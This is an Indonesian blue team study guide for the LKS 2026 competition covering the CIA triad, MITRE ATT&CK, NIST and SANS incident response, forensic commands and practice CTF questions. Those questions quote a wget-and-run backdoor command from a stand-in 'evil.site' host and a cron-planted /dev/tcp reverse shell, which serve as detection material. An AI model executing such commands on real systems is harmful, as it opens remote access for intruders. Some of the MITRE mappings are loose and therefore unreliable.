# 🛡️ Blue Team Fundamentals — LKS 2026 Ready

  

> **Target:** Siswa SMK | Level: Pemula–Menengah | Kompetisi: Agustus 2026  

> **Topik:** Mindset Defender · CIA Triad · MITRE ATT&CK · Siklus IR (NIST vs SANS)

  

---

  

## 1. KONSEP INTI

  

### Kenapa Topik Ini Penting di CTF/Blue Team?

  

Di LKS Blue Team, kamu **bukan yang nyerang — kamu yang jaga**. Soal-soal akan melempar kamu ke situasi: *"Server ini sudah diserang, temukan apa yang terjadi."* Tanpa kerangka berpikir yang benar, kamu akan panik dan buta arah.

  

**CIA Triad, MITRE ATT&CK, dan IR Cycle** adalah **kompas** kamu — tanpa ini, kamu seperti dokter UGD yang nggak tahu urutan triase.

  

---

  

### CIA Triad — Fondasi Segalanya

  

Analoginya: **brankas bank.**

  

| Prinsip | Artinya | Contoh Serangan |

|---|---|---|

| **Confidentiality** (Kerahasiaan) | Data hanya bisa diakses yang berhak | Data dump, credential leak |

| **Integrity** (Integritas) | Data tidak boleh diubah tanpa izin | File tampering, log wiping |

| **Availability** (Ketersediaan) | Sistem harus bisa diakses saat dibutuhkan | DDoS, ransomware |

  

> 💡 **Hafal ini:** Setiap soal Blue Team = selalu tanya *"CIA mana yang diserang?"*

  

---

  

### MITRE ATT&CK — Peta Pikiran Attacker

  

Bayangkan **playbook resep masakan para hacker** yang dikompilasi dari serangan nyata. Strukturnya:

  

```

Tactics (TUJUAN) → Techniques (CARA) → Sub-techniques (DETAIL)

     ↓                    ↓                      ↓

  "Initial Access"   "Phishing"          "Spearphishing Link"

   (T1566)           (T1566.002)

```

  

**14 Tactic utama** (urutan serangan nyata):

  

```

1.  Reconnaissance        → Ngintip target

2.  Resource Development  → Siapkan infrastruktur

3.  Initial Access        → Masuk pertama kali (phishing, exploit)

4.  Execution             → Jalankan malware/script

5.  Persistence           → Pasang backdoor biar bisa balik

6.  Privilege Escalation  → Naik jadi root/admin

7.  Defense Evasion       → Sembunyi dari antivirus/log

8.  Credential Access     → Curi password/hash

9.  Discovery             → Pelajari isi jaringan

10. Lateral Movement      → Pindah ke mesin lain

11. Collection            → Kumpulkan data target

12. C2 (Command & Control)→ Remote control malware

13. Exfiltration          → Kirim data keluar

14. Impact                → Rusak/enkripsi/hapus data

```

  

> 💡 **Di soal CTF:** Kamu dapat log/artefak → kamu identify Technique-nya → ini kunci jawaban *"apa yang dilakukan attacker."*

  

---

  

### Siklus IR — NIST vs SANS

  

**Analogi:** Rumah sakit darurat. Ada SOP-nya, bukan asal tindak.

  

```

NIST (4 Fase)                    SANS (6 Fase)

─────────────────────────────────────────────────────

1. Preparation              →    1. Preparation

2. Detection & Analysis     →    2. Identification

                            →    3. Containment

3. Containment, Eradication →    4. Eradication

   & Recovery               →    5. Recovery

4. Post-Incident Activity   →    6. Lessons Learned

```

  

> **NIST lebih umum/framework**, **SANS lebih operasional/detail**.  

> Di soal LKS, keduanya bisa muncul — hafal kedua-duanya.

  

---

  

## 2. CHEATSHEET PRAKTIS

  

### Tools Investigasi Blue Team

  

```bash

# ===== LOG ANALYSIS =====

cat /var/log/auth.log                      # Login attempts (SSH, sudo)

grep "Failed password" /var/log/auth.log   # Brute force attempts

grep "Accepted password" /var/log/auth.log # Successful logins

journalctl -xe                             # Systemd logs

last -a                                    # Riwayat login + IP

  

# ===== NETWORK FORENSICS =====

ss -tulnp                                  # Port yang sedang listen

netstat -antp                              # Semua koneksi aktif

tcpdump -i eth0 -w capture.pcap            # Capture traffic

tcpdump -r capture.pcap 'tcp port 4444'    # Baca capture, filter port

  

# ===== PROCESS & FILE FORENSICS =====

ps auxf                                    # Semua proses + hierarki

ls -la /proc/<PID>/exe                     # Binary dari proses mencurigakan

find / -mtime -1 -type f                   # File dimodifikasi <24 jam

stat file.txt                              # Timestamp lengkap (atime/mtime/ctime)

md5sum file.txt                            # Hash untuk integrity check

  

# ===== PERSISTENCE HUNTING =====

crontab -l                                 # Cron user saat ini

cat /etc/crontab                           # Cron sistem

ls /etc/cron.d/                            # Cron.d entries

systemctl list-units --type=service        # Semua service

cat /etc/passwd | grep -v nologin          # User dengan shell aktif

  

# ===== MEMORY & VOLATILE DATA =====

free -h                                    # Penggunaan RAM

dmesg | tail -50                           # Kernel ring buffer

lsof -i                                    # File/koneksi yang dibuka proses

```

  

### Contoh Output Nyata — Mencari Attacker Login

  

```bash

$ grep "Failed password" /var/log/auth.log | tail -5

May 27 02:13:44 server sshd[1337]: Failed password for root from 192.168.1.105 port 54321 ssh2

May 27 02:13:46 server sshd[1337]: Failed password for root from 192.168.1.105 port 54321 ssh2

May 27 02:13:49 server sshd[1337]: Failed password for root from 192.168.1.105 port 54321 ssh2

May 27 02:14:01 server sshd[1338]: Accepted password for admin from 192.168.1.105 port 54322 ssh2

# 🚨 Brute force dari .105, berhasil login sebagai 'admin' jam 02:14

```

  

---

  

## 3. WORKFLOW / LANGKAH KERJA

  

### SOP: Dapat Soal Log Analysis / Incident Response

  

```

LANGKAH 1 — ORIENTASI (2 menit)

├── Baca soal: CIA mana yang diserang?

├── Tentukan: soal minta apa? (IP attacker? Waktu? File yang diubah?)

└── Identifikasi: jenis log apa yang tersedia?

  

LANGKAH 2 — TIMELINE ATTACK (5 menit)

├── Cari event paling awal yang mencurigakan

├── grep keyword: "Failed", "error", "unauthorized", "DENIED"

└── Catat: WAKTU → AKSI → SIAPA → DARI MANA

  

LANGKAH 3 — MAPPING KE MITRE ATT&CK

├── Login gagal berulang     → T1110   (Brute Force)

├── Cron baru ditambahkan    → T1053.005 (Scheduled Task)

├── User baru dibuat         → T1136   (Create Account)

├── File /etc/passwd diubah  → T1078   (Valid Accounts)

└── Koneksi ke IP asing      → T1071   (Application Layer Protocol / C2)

  

LANGKAH 4 — TENTUKAN FASE IR

├── Kapan detected?          → Detection & Analysis

├── Apa yang dilakukan stop? → Containment

└── Apa yang perlu diperbaiki? → Eradication & Recovery

  

LANGKAH 5 — TULIS JAWABAN

└── Format: [Waktu] [Attacker IP] [Teknik] [Dampak ke CIA] [Fase IR]

```

  

---

  

## 4. SOAL LATIHAN CTF-STYLE

  

### 🟢 Soal 1 — MUDAH: "Siapa yang Login?"

  

**Skenario:**

  

Kamu adalah analis SOC di perusahaan kecil. Pagi-pagi manager panik: *"Semalam ada yang masuk ke server kita!"* Kamu dikasih file log ini:

  

```

May 27 01:00:12 webserver sshd[2201]: Failed password for root from 10.0.0.99 port 22341

May 27 01:00:15 webserver sshd[2201]: Failed password for root from 10.0.0.99 port 22341

May 27 01:00:18 webserver sshd[2201]: Failed password for root from 10.0.0.99 port 22341

May 27 01:00:21 webserver sshd[2201]: Failed password for root from 10.0.0.99 port 22341

May 27 01:00:24 webserver sshd[2202]: Accepted password for root from 10.0.0.99 port 22342

May 27 01:02:10 webserver sudo[2210]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://evil.site/backdoor.sh

May 27 01:02:15 webserver sudo[2211]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash backdoor.sh

```

  

**Pertanyaan:**

1. IP attacker siapa?

2. Teknik apa yang dipakai? (nama MITRE)

3. CIA apa yang sudah terkena dampak?

4. Ini masuk fase IR yang mana?

  

---

  

**Hint 1:** Perhatikan pola "Failed password" yang berulang — apa kesimpulannya?

  

**Hint 2:** `wget http://evil.site/backdoor.sh` → attacker mengunduh sesuatu. Ini tactic MITRE apa?

  

**Hint 3:** Setelah kamu menemukan semua ini dari log, kamu sedang di fase IR yang mana?

  

---

  

**✅ JAWABAN LENGKAP:**

  

1. **IP Attacker:** `10.0.0.99`

  

2. **Teknik MITRE:**

   - `T1110.001` — Brute Force: Password Guessing (4x gagal, lalu berhasil)

   - `T1059.004` — Command & Scripting: Unix Shell (wget + bash)

   - `T1105`     — Ingress Tool Transfer (download backdoor.sh dari internet)

  

3. **CIA yang terdampak:**

   - **Confidentiality** — attacker bisa baca file di server

   - **Integrity** — backdoor.sh dijalankan, file sistem bisa diubah

   - **Availability** — potensi backdoor bikin server jadi zombie

  

4. **Fase IR:** Kamu sedang di **Detection & Analysis** (NIST) = **Identification** (SANS)

  

> **Kenapa ini solusinya?** Log SSH selalu catat "Failed" vs "Accepted" — pola Failed berulang + Accepted = textbook brute force. Wget ke domain mencurigakan = download malware = Initial Access → Execution di MITRE.

  

---

  

### 🟡 Soal 2 — SEDANG: "Backdoor Tersembunyi"

  

**Skenario:**

  

Server production berperilaku aneh — ada traffic keluar ke IP asing jam 3 pagi setiap hari. Kamu dapat akses ke server. Temukan persistence mechanism yang dipasang attacker.

  

```bash

# Output 'crontab -l' untuk user www-data:

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/203.0.113.45/4444 0>&1'

  

# Output 'cat /etc/passwd | tail -3':

mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

x3r0:x:1001:1001::/home/x3r0:/bin/bash

  

# Output 'ls -la /tmp/':

-rwxr-xr-x 1 www-data www-data  8192 May 26 03:01 .hidden_agent

-rw-r--r-- 1 root     root      2048 May 26 12:00 tmpfile.txt

```

  

**Pertanyaan:**

1. Ada berapa persistence mechanism yang kamu temukan?

2. Jelaskan apa fungsi command di crontab itu

3. Mapping semua temuan ke MITRE Technique

4. Langkah Containment yang harus dilakukan (urut!)

  

---

  

**Hint 1:** `/dev/tcp/IP/PORT` di bash — apa yang dilakukan ini?

  

**Hint 2:** User `x3r0` — apakah ini user legitimate? Gimana cara cek?

  

**Hint 3:** File `.hidden_agent` di `/tmp` — kenapa mencurigakan? (perhatikan owner dan permission-nya)

  

---

  

**✅ JAWABAN LENGKAP:**

  

**1. Ada 3 persistence mechanism:**

- Cron job reverse shell

- User backdoor (`x3r0`)

- Binary tersembunyi di `/tmp`

  

**2. Fungsi cron command:**

  

```bash

bash -i >& /dev/tcp/203.0.113.45/4444 0>&1

#      ↑               ↑                ↑

#  interactive    kirim output ke    redirect stderr

#   shell         IP:port attacker   ke stdout juga

```

  

Ini **reverse shell** — server kamu yang "menelepon" attacker, bukan sebaliknya. Makanya bypass firewall inbound!

  

**3. Mapping MITRE:**

  

| Temuan | MITRE ID | Nama |

|---|---|---|

| Cron reverse shell | T1053.003 | Cron Job |

| Reverse shell TCP  | T1071.001 | Web Protocols / C2 |

| User x3r0 baru     | T1136.001 | Create Local Account |

| Binary di /tmp     | T1105     | Ingress Tool Transfer |

  

**4. Langkah Containment (urut!):**

  

```bash

# STEP 1 — ISOLASI JARINGAN

iptables -A OUTPUT -d 203.0.113.45 -j DROP

  

# STEP 2 — MATIKAN PROSES AKTIF

ps auxf | grep bash

kill -9 <PID>

  

# STEP 3 — HAPUS PERSISTENCE

crontab -r -u www-data       # Hapus cron

userdel -r x3r0              # Hapus user backdoor

rm /tmp/.hidden_agent        # Hapus binary

  

# STEP 4 — RESET CREDENTIAL

passwd www-data              # Ubah password jika perlu

  

# STEP 5 — DOKUMENTASI untuk Lessons Learned

```

  

> **Kenapa ini solusinya?** `/dev/tcp` adalah fitur bash built-in untuk buka TCP connection — sering dipakai reverse shell karena tidak butuh tools tambahan. Tanda `.` di depan nama file = hidden file di Linux.

  

---

  

## 5. JEBAKAN & KESALAHAN UMUM

  

### ❌ Kesalahan #1: Langsung hapus tanpa dokumentasi

  

**Yang terjadi:** Attacker ketahuan → langsung `rm -rf` semua file berbahaya → data forensik hilang → tidak bisa tau teknik apa yang dipakai → akan kena lagi.

  

**✅ Cara hindari:** Dokumentasi dulu, aksi kemudian. Screenshot, catat hash (`md5sum`), backup log sebelum dihapus. Di kompetisi: catat semua temuan di notepad sebelum ambil langkah apapun.

  

---

  

### ❌ Kesalahan #2: Lupa cek persistence setelah clean

  

**Yang terjadi:** Kamu hapus malware, reboot server, 5 menit kemudian kena lagi karena cron job masih ada.

  

**✅ Cara hindari:** Selalu cek **semua lokasi persistence** sebelum declare "clean":

  

```bash

crontab -l && cat /etc/crontab         # Cron

ls /etc/cron.d/ /etc/cron.hourly/      # Cron.d

systemctl list-units --state=enabled   # Services

cat /etc/rc.local                      # Startup script

cat ~/.bashrc ~/.profile               # Shell hooks

```

  

---

  

### ❌ Kesalahan #3: Salah identifikasi fase IR

  

**Yang terjadi:** Soal tanya *"Ini fase apa?"* → jawab asal → poin hilang padahal paham situasinya.

  

**✅ Cara hindari:** Hafal trigger word ini:

  

| Kata kunci di soal | Fase NIST | Fase SANS |

|---|---|---|

| "menemukan insiden" | Detection & Analysis | Identification |

| "memblokir/isolasi" | Containment | Containment |

| "menghapus malware" | Eradication | Eradication |

| "pulihkan layanan"  | Recovery | Recovery |

| "evaluasi/review"   | Post-Incident | Lessons Learned |

  

---

  

## 6. KALIMAT HAFALAN CEPAT 🧠

  

```

╔══════════════════════════════════════════════════════════╗

║  FLASHCARD BLUE TEAM FUNDAMENTALS                        ║

╠══════════════════════════════════════════════════════════╣

║  1. CIA = Rahasia · Utuh · Tersedia                      ║

║     Setiap insiden → tanya: CIA mana yang diserang?      ║

╠══════════════════════════════════════════════════════════╣

║  2. MITRE ATT&CK = GPS serangan                          ║

║     Tactic = TUJUAN, Technique = CARA                    ║

║     Hafal: Initial Access → Execution → Persistence      ║

╠══════════════════════════════════════════════════════════╣

║  3. NIST IR = 4 fase (Prep·Detect·Contain·Post)          ║

║     SANS IR = 6 fase (tambah Identification & Eradicate) ║

╠══════════════════════════════════════════════════════════╣

║  4. Dokumentasi DULU, aksi KEMUDIAN                      ║

║     Hash → Screenshot → Lalu baru hapus/isolasi          ║

╠══════════════════════════════════════════════════════════╣

║  5. Cron + User baru + Binary di /tmp                    ║

║     = 3 tanda klasik persistence attacker di Linux       ║

╚══════════════════════════════════════════════════════════╝

```

  

---

  

## 7. KONEKSI KE TOPIK PAM.D

  

> PAM (`/etc/pam.d/`) adalah bagian dari **Prevention** di fase **Preparation** IR — kamu hardening supaya Initial Access lebih susah.

>

> **Next step:** Setelah paham IR cycle, petakan: *"hardening PAM mencegah Tactic MITRE yang mana?"*

>

> Contoh: `pam_faillock` → mencegah **T1110 (Brute Force)**  

> Contoh: `pam_unix` + password policy → mencegah **T1078 (Valid Accounts)**

  

---

  

*Dibuat untuk persiapan LKS 2026 — Blue Team Category*  

*Last updated: Mei 2026*